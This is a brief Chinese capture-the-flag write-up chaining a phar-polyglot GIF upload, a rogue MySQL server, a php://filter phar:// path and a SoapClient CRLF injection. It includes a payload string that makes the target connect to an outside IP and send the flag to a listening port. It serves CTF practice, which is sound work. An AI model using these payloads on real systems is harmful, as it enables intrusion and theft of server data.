通过 phar.php 生成 1.gif，通过上传页面上传得到路径。
记录路径为 

upload/122c4a55d1a70cef972cac3982dd49a6/b5e9b4f86ce43ca65bd79c894c4a924c.gif

在 rogue mysql 服务器上读取文件的位置使用 phar 协议读取

phar://./upload/122c4a55d1a70cef972cac3982dd49a6/b5e9b4f86ce43ca65bd79c894c4a924c.gif

去 func.php 提交
php://filter/read=convert.base64-encode/resource=phar://./upload/122c4a55d1a70cef972cac3982dd49a6/b5e9b4f86ce43ca65bd79c894c4a924c.gif

就可以在自己服务器监听的端口收到 flag 了。

主要是 phar soap client crlf 那里
```php
$post_string = 'admin=1&clazz=Mysqli&func1=init&arg1=&func2=real_connect&arg2[0]=106.14.153.173&arg2[1]=root&arg2[2]=123&arg2[3]=test&arg2[4]=3306&func3=query&arg3=select%201&ip=106.14.153.173&port=2015';
```

ip & port 两个参数是用来获取 flag 的

